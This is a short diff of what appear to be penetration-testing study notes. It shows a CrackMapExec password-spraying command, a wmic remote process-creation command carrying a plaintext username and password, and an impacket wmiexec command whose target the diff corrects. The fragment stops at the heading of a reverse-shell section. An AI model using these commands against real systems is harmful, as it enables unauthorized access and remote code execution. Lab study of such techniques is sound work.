@@ -158,7 +158,7 @@ cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3
 ```
 Testing:
 Windows: wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
-Kali: python3 /usr/share/doc/python3-impacket/examples/wmiexec.py damon@192.168.236.247 -k 
+Kali: python3 /usr/share/doc/python3-impacket/examples/wmiexec.py domain/damon@192.168.236.247 -k 
 
 Reverse shell:
 import sys
